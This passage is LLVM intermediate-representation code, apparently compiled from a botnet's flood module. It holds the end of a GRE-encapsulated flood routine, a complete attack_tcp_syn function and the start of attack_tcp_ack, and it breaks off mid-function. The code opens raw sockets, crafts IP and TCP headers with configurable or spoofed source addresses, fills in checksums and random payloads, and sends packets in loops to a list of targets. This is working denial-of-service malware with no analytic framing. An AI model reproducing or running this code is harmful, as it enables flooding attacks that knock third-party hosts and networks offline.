; <label>:48:                                     ; preds = %33
  %49 = call i32 @close(i32 %31) #9
  br label %197

..preheader_crit_edge:                            ; preds = %108
  %50 = trunc i64 %indvars.iv.next to i32
  store i32 %50, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader132, %..preheader_crit_edge
  %51 = icmp eq i32 %30, -1
  %52 = and i32 %14, 65535
  %53 = icmp eq i32 %52, 65535
  %54 = and i32 %20, 65535
  %55 = icmp eq i32 %54, 65535
  %56 = and i32 %22, 65535
  %57 = icmp eq i32 %56, 65535
  %58 = icmp eq i8 %28, 0
  %59 = bitcast i32* %6 to i8*
  %60 = bitcast i32* %7 to i8*
  %61 = bitcast i32* %8 to i8*
  %62 = getelementptr inbounds i8, i8* %61, i64 2
  %63 = icmp eq i8 %26, 0
  %64 = add i32 %24, 8
  br label %.loopexit

; <label>:65:                                     ; preds = %.lr.ph134, %108
  %indvars.iv = phi i64 [ 0, %.lr.ph134 ], [ %indvars.iv.next, %108 ]
  %66 = call noalias i8* @calloc(i64 1510, i64 8) #9
  %67 = getelementptr inbounds i8*, i8** %11, i64 %indvars.iv
  store i8* %66, i8** %67, align 8
  %68 = getelementptr inbounds i8, i8* %66, i64 38
  %69 = getelementptr inbounds i8, i8* %66, i64 58
  store i8 69, i8* %66, align 4
  %70 = getelementptr inbounds i8, i8* %66, i64 1
  store i8 %13, i8* %70, align 1
  %71 = call zeroext i16 @htons(i16 zeroext %39) #10
  %72 = getelementptr inbounds i8, i8* %66, i64 2
  %73 = bitcast i8* %72 to i16*
  store i16 %71, i16* %73, align 2
  %74 = call zeroext i16 @htons(i16 zeroext %15) #10
  %75 = getelementptr inbounds i8, i8* %66, i64 4
  %76 = bitcast i8* %75 to i16*
  store i16 %74, i16* %76, align 4
  %77 = getelementptr inbounds i8, i8* %66, i64 8
  store i8 %17, i8* %77, align 4
  br i1 %40, label %78, label %82

; <label>:78:                                     ; preds = %65
  %79 = call zeroext i16 @htons(i16 zeroext 16384) #10
  %80 = getelementptr inbounds i8, i8* %66, i64 6
  %81 = bitcast i8* %80 to i16*
  store i16 %79, i16* %81, align 2
  br label %82

; <label>:82:                                     ; preds = %78, %65
  %83 = getelementptr inbounds i8, i8* %66, i64 9
  store i8 47, i8* %83, align 1
  %84 = getelementptr inbounds i8, i8* %66, i64 12
  %85 = bitcast i8* %84 to i32*
  store i32 %30, i32* %85, align 4
  %86 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %87 = load i32, i32* %86, align 4
  %88 = getelementptr inbounds i8, i8* %66, i64 16
  %89 = bitcast i8* %88 to i32*
  store i32 %87, i32* %89, align 4
  %90 = call zeroext i16 @htons(i16 zeroext 25944) #10
  %91 = getelementptr inbounds i8, i8* %66, i64 22
  %92 = bitcast i8* %91 to i16*
  store i16 %90, i16* %92, align 2
  %93 = call zeroext i16 @htons(i16 zeroext 2048) #10
  %94 = getelementptr inbounds i8, i8* %66, i64 36
  %95 = bitcast i8* %94 to i16*
  store i16 %93, i16* %95, align 1
  store i8 69, i8* %68, align 4
  %96 = getelementptr inbounds i8, i8* %66, i64 39
  store i8 %13, i8* %96, align 1
  %97 = call zeroext i16 @htons(i16 zeroext %42) #10
  %98 = getelementptr inbounds i8, i8* %66, i64 40
  %99 = bitcast i8* %98 to i16*
  store i16 %97, i16* %99, align 2
  %100 = call zeroext i16 @htons(i16 zeroext %43) #10
  %101 = getelementptr inbounds i8, i8* %66, i64 42
  %102 = bitcast i8* %101 to i16*
  store i16 %100, i16* %102, align 4
  %103 = getelementptr inbounds i8, i8* %66, i64 46
  store i8 %17, i8* %103, align 4
  br i1 %40, label %104, label %108

; <label>:104:                                    ; preds = %82
  %105 = call zeroext i16 @htons(i16 zeroext 16384) #10
  %106 = getelementptr inbounds i8, i8* %66, i64 44
  %107 = bitcast i8* %106 to i16*
  store i16 %105, i16* %107, align 2
  br label %108

; <label>:108:                                    ; preds = %104, %82
  %109 = getelementptr inbounds i8, i8* %66, i64 47
  store i8 17, i8* %109, align 1
  %. = select i1 %44, i32 1023, i32 %87
  %110 = getelementptr inbounds i8, i8* %66, i64 54
  %111 = bitcast i8* %110 to i32*
  store i32 %., i32* %111, align 4
  %112 = call zeroext i16 @htons(i16 zeroext %21) #10
  %113 = bitcast i8* %69 to i16*
  store i16 %112, i16* %113, align 2
  %114 = call zeroext i16 @htons(i16 zeroext %23) #10
  %115 = getelementptr inbounds i8, i8* %66, i64 60
  %116 = bitcast i8* %115 to i16*
  store i16 %114, i16* %116, align 2
  %117 = call zeroext i16 @htons(i16 zeroext %46) #10
  %118 = getelementptr inbounds i8, i8* %66, i64 62
  %119 = bitcast i8* %118 to i16*
  store i16 %117, i16* %119, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %120 = icmp slt i64 %indvars.iv.next, %47
  br i1 %120, label %65, label %..preheader_crit_edge

.loopexit.loopexit:                               ; preds = %168
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %38, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %168
  %storemerge131133 = phi i32 [ %195, %168 ], [ 0, %.lr.ph.preheader ]
  %121 = sext i32 %storemerge131133 to i64
  %122 = getelementptr inbounds i8*, i8** %11, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = getelementptr inbounds i8, i8* %123, i64 24
  %125 = getelementptr inbounds i8, i8* %123, i64 38
  %126 = bitcast i8* %125 to %struct.iphdr*
  %127 = getelementptr inbounds i8, i8* %123, i64 58
  %128 = getelementptr inbounds i8, i8* %123, i64 66
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %121, i32 2
  %130 = load i8, i8* %129, align 4
  %131 = icmp ult i8 %130, 32
  br i1 %131, label %132, label %139

; <label>:132:                                    ; preds = %.lr.ph
  %133 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %121, i32 1
  %134 = load i32, i32* %133, align 4
  %135 = call i32 @ntohl(i32 %134) #10
  %136 = call i32 @htonl(i32 %135) #10
  %137 = getelementptr inbounds i8, i8* %123, i64 16
  %138 = bitcast i8* %137 to i32*
  store i32 %136, i32* %138, align 4
  br label %139

; <label>:139:                                    ; preds = %132, %.lr.ph
  br i1 %51, label %140, label %143

; <label>:140:                                    ; preds = %139
  %141 = getelementptr inbounds i8, i8* %123, i64 12
  %142 = bitcast i8* %141 to i32*
  store i32 0, i32* %142, align 4
  br label %143

; <label>:143:                                    ; preds = %140, %139
  br i1 %53, label %144, label %149

; <label>:144:                                    ; preds = %143
  %145 = getelementptr inbounds i8, i8* %123, i64 4
  %146 = bitcast i8* %145 to i16*
  store i16 0, i16* %146, align 4
  %147 = getelementptr inbounds i8, i8* %123, i64 42
  %148 = bitcast i8* %147 to i16*
  store i16 999, i16* %148, align 4
  br label %149

; <label>:149:                                    ; preds = %144, %143
  br i1 %55, label %150, label %152

; <label>:150:                                    ; preds = %149
  %151 = bitcast i8* %127 to i16*
  store i16 0, i16* %151, align 2
  br label %152

; <label>:152:                                    ; preds = %150, %149
  br i1 %57, label %153, label %156

; <label>:153:                                    ; preds = %152
  %154 = getelementptr inbounds i8, i8* %123, i64 60
  %155 = bitcast i8* %154 to i16*
  store i16 0, i16* %155, align 2
  br label %156

; <label>:156:                                    ; preds = %153, %152
  br i1 %58, label %161, label %157

; <label>:157:                                    ; preds = %156
  %158 = getelementptr inbounds i8, i8* %123, i64 16
  %159 = bitcast i8* %158 to i32*
  %160 = load i32, i32* %159, align 4
  br label %161

; <label>:161:                                    ; preds = %156, %157
  %.sink3 = phi i32 [ %160, %157 ], [ 0, %156 ]
  %162 = getelementptr inbounds i8, i8* %123, i64 54
  %163 = bitcast i8* %162 to i32*
  store i32 %.sink3, i32* %163, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  call void @util_memcpy(i8* %124, i8* nonnull %59, i32 4) #9
  %164 = getelementptr inbounds i8, i8* %123, i64 30
  call void @util_memcpy(i8* %164, i8* nonnull %60, i32 4) #9
  %165 = getelementptr inbounds i8, i8* %123, i64 28
  call void @util_memcpy(i8* %165, i8* nonnull %61, i32 2) #9
  %166 = getelementptr inbounds i8, i8* %123, i64 34
  call void @util_memcpy(i8* %166, i8* %62, i32 2) #9
  br i1 %63, label %168, label %167

; <label>:167:                                    ; preds = %161
  call void @rand_str(i8* nonnull %128, i32 %24)
  br label %168

; <label>:168:                                    ; preds = %161, %167
  %169 = getelementptr inbounds i8, i8* %123, i64 10
  %170 = bitcast i8* %169 to i16*
  store i16 0, i16* %170, align 2
  %171 = bitcast i8* %123 to i16*
  %172 = call zeroext i16 @checksum_generic(i16* %171, i32 20) #9
  store i16 %172, i16* %170, align 2
  %173 = getelementptr inbounds i8, i8* %123, i64 48
  %174 = bitcast i8* %173 to i16*
  store i16 0, i16* %174, align 2
  %175 = bitcast i8* %125 to i16*
  %176 = call zeroext i16 @checksum_generic(i16* %175, i32 20) #9
  store i16 %176, i16* %174, align 2
  %177 = getelementptr inbounds i8, i8* %123, i64 64
  %178 = bitcast i8* %177 to i16*
  store i16 0, i16* %178, align 2
  %179 = getelementptr inbounds i8, i8* %123, i64 62
  %180 = bitcast i8* %179 to i16*
  %181 = load i16, i16* %180, align 2
  %182 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %126, i8* nonnull %127, i16 zeroext %181, i32 %64) #9
  store i16 %182, i16* %178, align 2
  %183 = load i32, i32* %5, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %184, i32 0, i32 0
  store i16 2, i16* %185, align 4
  %186 = getelementptr inbounds i8, i8* %123, i64 16
  %187 = bitcast i8* %186 to i32*
  %188 = load i32, i32* %187, align 4
  %189 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %184, i32 0, i32 2, i32 0
  store i32 %188, i32* %189, align 4
  %190 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %184, i32 0, i32 1
  store i16 0, i16* %190, align 2
  %191 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %184, i32 0
  %192 = bitcast %struct.sockaddr_in* %191 to %struct.sockaddr*
  %193 = call i64 @sendto(i32 %31, i8* nonnull %123, i64 %.pre136, i32 16384, %struct.sockaddr* %192, i32 16) #9
  %194 = load i32, i32* %5, align 4
  %195 = add nsw i32 %194, 1
  store i32 %195, i32* %5, align 4
  %196 = icmp slt i32 %195, %37
  br i1 %196, label %.lr.ph, label %.loopexit.loopexit

; <label>:197:                                    ; preds = %4, %48
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #9
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 0)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 0)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 1)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = load i32, i32* @LOCAL_ADDR, align 4
  %36 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %35)
  %37 = tail call i32 @socket(i32 2, i32 3, i32 6) #9
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %191, label %39

; <label>:39:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %40 = bitcast i32* %5 to i8*
  %41 = call i32 @setsockopt(i32 %37, i32 0, i32 3, i8* nonnull %40, i32 4) #9
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %66, label %.preheader128

.preheader128:                                    ; preds = %39
  store i32 0, i32* %5, align 4
  %43 = zext i8 %0 to i32
  %44 = icmp eq i8 %0, 0
  br i1 %44, label %.preheader, label %.lr.ph130

.lr.ph130:                                        ; preds = %.preheader128
  %45 = icmp eq i8 %16, 0
  %46 = trunc i32 %21 to i16
  %47 = and i8 %24, 1
  %48 = zext i8 %47 to i16
  %49 = shl nuw nsw i16 %48, 13
  %50 = shl i16 %26, 12
  %51 = and i16 %50, 4096
  %52 = shl i16 %28, 11
  %53 = and i16 %52, 2048
  %54 = shl i16 %30, 10
  %55 = and i16 %54, 1024
  %56 = shl i16 %32, 9
  %57 = and i16 %56, 512
  %58 = shl i16 %34, 8
  %59 = and i16 %58, 256
  %60 = or i16 %49, %51
  %61 = or i16 %60, %53
  %62 = or i16 %61, %55
  %.masked = or i16 %62, %57
  %63 = or i16 %.masked, %59
  %64 = zext i8 %0 to i64
  %65 = or i16 %63, 160
  br label %79

; <label>:66:                                     ; preds = %39
  %67 = call i32 @close(i32 %37) #9
  br label %191

..preheader_crit_edge:                            ; preds = %96
  %68 = trunc i64 %indvars.iv.next to i32
  store i32 %68, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader128, %..preheader_crit_edge
  %69 = icmp eq i32 %36, -1
  %70 = and i32 %11, 65535
  %71 = icmp eq i32 %70, 65535
  %72 = and i32 %17, 65535
  %73 = icmp eq i32 %72, 65535
  %74 = and i32 %19, 65535
  %75 = icmp eq i32 %74, 65535
  %76 = icmp eq i32 %21, 65535
  %77 = icmp eq i32 %22, 65535
  %78 = icmp eq i8 %24, 0
  br label %.loopexit

; <label>:79:                                     ; preds = %.lr.ph130, %96
  %indvars.iv = phi i64 [ 0, %.lr.ph130 ], [ %indvars.iv.next, %96 ]
  %80 = call noalias i8* @calloc(i64 128, i64 1) #9
  %81 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %80, i8** %81, align 8
  %82 = getelementptr inbounds i8, i8* %80, i64 20
  %83 = getelementptr inbounds i8, i8* %80, i64 40
  store i8 69, i8* %80, align 4
  %84 = getelementptr inbounds i8, i8* %80, i64 1
  store i8 %10, i8* %84, align 1
  %85 = call zeroext i16 @htons(i16 zeroext 60) #10
  %86 = getelementptr inbounds i8, i8* %80, i64 2
  %87 = bitcast i8* %86 to i16*
  store i16 %85, i16* %87, align 2
  %88 = call zeroext i16 @htons(i16 zeroext %12) #10
  %89 = getelementptr inbounds i8, i8* %80, i64 4
  %90 = bitcast i8* %89 to i16*
  store i16 %88, i16* %90, align 4
  %91 = getelementptr inbounds i8, i8* %80, i64 8
  store i8 %14, i8* %91, align 4
  br i1 %45, label %96, label %92

; <label>:92:                                     ; preds = %79
  %93 = call zeroext i16 @htons(i16 zeroext 16384) #10
  %94 = getelementptr inbounds i8, i8* %80, i64 6
  %95 = bitcast i8* %94 to i16*
  store i16 %93, i16* %95, align 2
  br label %96

; <label>:96:                                     ; preds = %79, %92
  %97 = getelementptr inbounds i8, i8* %80, i64 9
  store i8 6, i8* %97, align 1
  %98 = getelementptr inbounds i8, i8* %80, i64 12
  %99 = bitcast i8* %98 to i32*
  store i32 %36, i32* %99, align 4
  %100 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %101 = load i32, i32* %100, align 4
  %102 = getelementptr inbounds i8, i8* %80, i64 16
  %103 = bitcast i8* %102 to i32*
  store i32 %101, i32* %103, align 4
  %104 = call zeroext i16 @htons(i16 zeroext %18) #10
  %105 = bitcast i8* %82 to i16*
  store i16 %104, i16* %105, align 4
  %106 = call zeroext i16 @htons(i16 zeroext %20) #10
  %107 = getelementptr inbounds i8, i8* %80, i64 22
  %108 = bitcast i8* %107 to i16*
  store i16 %106, i16* %108, align 2
  %109 = call zeroext i16 @htons(i16 zeroext %46) #10
  %110 = zext i16 %109 to i32
  %111 = getelementptr inbounds i8, i8* %80, i64 24
  %112 = bitcast i8* %111 to i32*
  store i32 %110, i32* %112, align 4
  %113 = getelementptr inbounds i8, i8* %80, i64 32
  %114 = bitcast i8* %113 to i16*
  store i16 %65, i16* %114, align 4
  %115 = getelementptr inbounds i8, i8* %80, i64 41
  store i8 2, i8* %83, align 1
  %116 = getelementptr inbounds i8, i8* %80, i64 42
  store i8 4, i8* %115, align 1
  %117 = call zeroext i16 @htons(i16 zeroext 1400) #10
  %118 = bitcast i8* %116 to i16*
  store i16 %117, i16* %118, align 2
  %119 = getelementptr inbounds i8, i8* %80, i64 44
  %120 = getelementptr inbounds i8, i8* %80, i64 45
  store i8 4, i8* %119, align 1
  %121 = getelementptr inbounds i8, i8* %80, i64 46
  store i8 2, i8* %120, align 1
  %122 = getelementptr inbounds i8, i8* %80, i64 47
  store i8 8, i8* %121, align 1
  store i8 10, i8* %122, align 1
  %123 = getelementptr inbounds i8, i8* %80, i64 56
  %124 = getelementptr inbounds i8, i8* %80, i64 57
  store i8 1, i8* %123, align 1
  %125 = getelementptr inbounds i8, i8* %80, i64 58
  store i8 3, i8* %124, align 1
  %126 = getelementptr inbounds i8, i8* %80, i64 59
  store i8 3, i8* %125, align 1
  store i8 6, i8* %126, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %127 = icmp slt i64 %indvars.iv.next, %64
  br i1 %127, label %79, label %..preheader_crit_edge

.loopexit.loopexit:                               ; preds = %170
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %44, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %170
  %storemerge122129 = phi i32 [ %189, %170 ], [ 0, %.lr.ph.preheader ]
  %128 = sext i32 %storemerge122129 to i64
  %129 = getelementptr inbounds i8*, i8** %8, i64 %128
  %130 = load i8*, i8** %129, align 8
  %131 = bitcast i8* %130 to %struct.iphdr*
  %132 = getelementptr inbounds i8, i8* %130, i64 20
  %133 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %128, i32 2
  %134 = load i8, i8* %133, align 4
  %135 = icmp ult i8 %134, 32
  br i1 %135, label %136, label %143

; <label>:136:                                    ; preds = %.lr.ph
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %128, i32 1
  %138 = load i32, i32* %137, align 4
  %139 = call i32 @ntohl(i32 %138) #10
  %140 = call i32 @htonl(i32 %139) #10
  %141 = getelementptr inbounds i8, i8* %130, i64 16
  %142 = bitcast i8* %141 to i32*
  store i32 %140, i32* %142, align 4
  br label %143

; <label>:143:                                    ; preds = %136, %.lr.ph
  br i1 %69, label %144, label %147

; <label>:144:                                    ; preds = %143
  %145 = getelementptr inbounds i8, i8* %130, i64 12
  %146 = bitcast i8* %145 to i32*
  store i32 0, i32* %146, align 4
  br label %147

; <label>:147:                                    ; preds = %144, %143
  br i1 %71, label %148, label %151

; <label>:148:                                    ; preds = %147
  %149 = getelementptr inbounds i8, i8* %130, i64 4
  %150 = bitcast i8* %149 to i16*
  store i16 0, i16* %150, align 4
  br label %151

; <label>:151:                                    ; preds = %148, %147
  br i1 %73, label %152, label %154

; <label>:152:                                    ; preds = %151
  %153 = bitcast i8* %132 to i16*
  store i16 0, i16* %153, align 4
  br label %154

; <label>:154:                                    ; preds = %152, %151
  br i1 %75, label %155, label %158

; <label>:155:                                    ; preds = %154
  %156 = getelementptr inbounds i8, i8* %130, i64 22
  %157 = bitcast i8* %156 to i16*
  store i16 0, i16* %157, align 2
  br label %158

; <label>:158:                                    ; preds = %155, %154
  br i1 %76, label %159, label %162

; <label>:159:                                    ; preds = %158
  %160 = getelementptr inbounds i8, i8* %130, i64 24
  %161 = bitcast i8* %160 to i32*
  store i32 0, i32* %161, align 4
  br label %162

; <label>:162:                                    ; preds = %159, %158
  br i1 %77, label %163, label %166

; <label>:163:                                    ; preds = %162
  %164 = getelementptr inbounds i8, i8* %130, i64 28
  %165 = bitcast i8* %164 to i32*
  store i32 0, i32* %165, align 4
  br label %166

; <label>:166:                                    ; preds = %163, %162
  br i1 %78, label %170, label %167

; <label>:167:                                    ; preds = %166
  %168 = getelementptr inbounds i8, i8* %130, i64 38
  %169 = bitcast i8* %168 to i16*
  store i16 0, i16* %169, align 2
  br label %170

; <label>:170:                                    ; preds = %166, %167
  %171 = getelementptr inbounds i8, i8* %130, i64 10
  %172 = bitcast i8* %171 to i16*
  store i16 0, i16* %172, align 2
  %173 = bitcast i8* %130 to i16*
  %174 = call zeroext i16 @checksum_generic(i16* %173, i32 20) #9
  store i16 %174, i16* %172, align 2
  %175 = getelementptr inbounds i8, i8* %130, i64 36
  %176 = bitcast i8* %175 to i16*
  store i16 0, i16* %176, align 4
  %177 = call zeroext i16 @htons(i16 zeroext 40) #10
  %178 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %131, i8* %132, i16 zeroext %177, i32 40) #9
  store i16 %178, i16* %176, align 4
  %179 = getelementptr inbounds i8, i8* %130, i64 22
  %180 = bitcast i8* %179 to i16*
  %181 = load i16, i16* %180, align 2
  %182 = load i32, i32* %5, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %183, i32 0, i32 1
  store i16 %181, i16* %184, align 2
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %183, i32 0
  %186 = bitcast %struct.sockaddr_in* %185 to %struct.sockaddr*
  %187 = call i64 @sendto(i32 %37, i8* %130, i64 60, i32 16384, %struct.sockaddr* %186, i32 16) #9
  %188 = load i32, i32* %5, align 4
  %189 = add nsw i32 %188, 1
  store i32 %189, i32* %5, align 4
  %190 = icmp slt i32 %189, %43
  br i1 %190, label %.lr.ph, label %.loopexit.loopexit

; <label>:191:                                    ; preds = %4, %66
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_ack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #9
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 65535)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i8
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %36 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %37 = trunc i32 %36 to i8
  %38 = load i32, i32* @LOCAL_ADDR, align 4
  %39 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %38)
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #9
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %190, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #9
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %70, label %.preheader127

.preheader127:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader, label %.lr.ph129

.lr.ph129:                                        ; preds = %.preheader127
  %48 = trunc i32 %35 to i16
  %49 = add i16 %48, 40
  %50 = icmp eq i8 %16, 0
  %51 = trunc i32 %21 to i16
  %52 = shl i16 %24, 13
  %53 = and i16 %52, 8192
  %54 = shl i16 %26, 12
  %55 = and i16 %54, 4096
  %56 = and i8 %28, 1
  %57 = zext i8 %56 to i16
  %58 = shl nuw nsw i16 %57, 11
  %59 = shl i16 %30, 10
  %60 = and i16 %59, 1024
  %61 = shl i16 %32, 9
  %62 = and i16 %61, 512
  %63 = shl i16 %34, 8
  %64 = and i16 %63, 256
  %65 = or i16 %53, %55
  %66 = or i16 %65, %58
  %67 = or i16 %66, %60
  %.masked = or i16 %67, %62
  %68 = or i16 %.masked, %64
  %69 = icmp eq i8 %28, 0
  %..v = select i1 %69, i16 80, i16 2128
  %. = or i16 %68, %..v
  br label %87

; <label>:70:                                     ; preds = %42
  %71 = call i32 @close(i32 %40) #9
  br label %190

.preheader.loopexit:                              ; preds = %106
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader127
  %72 = icmp eq i32 %39, -1
  %73 = and i32 %11, 65535
  %74 = icmp eq i32 %73, 65535
  %75 = and i32 %17, 65535
  %76 = icmp eq i32 %75, 65535
  %77 = and i32 %19, 65535
  %78 = icmp eq i32 %77, 65535
  %79 = icmp eq i32 %21, 65535
  %80 = icmp eq i32 %22, 65535
  %81 = icmp eq i8 %37, 0
  %82 = sext i32 %35 to i64
  %83 = add nsw i64 %82, 20
  %84 = trunc i64 %83 to i16
  %85 = trunc i64 %83 to i32
  %86 = add nsw i64 %82, 40
  br label %.loopexit

; <label>:87:                                     ; preds = %.lr.ph129, %106
  %88 = phi i32 [ 0, %.lr.ph129 ], [ %126, %106 ]
  %89 = call noalias i8* @calloc(i64 1510, i64 1) #9
  %90 = sext i32 %88 to i64
  %91 = getelementptr inbounds i8*, i8** %8, i64 %90
  store i8* %89, i8** %91, align 8
  %92 = getelementptr inbounds i8, i8* %89, i64 20
  %93 = getelementptr inbounds i8, i8* %89, i64 40
  store i8 69, i8* %89, align 4
  %94 = getelementptr inbounds i8, i8* %89, i64 1
  store i8 %10, i8* %94, align 1
  %95 = call zeroext i16 @htons(i16 zeroext %49) #10
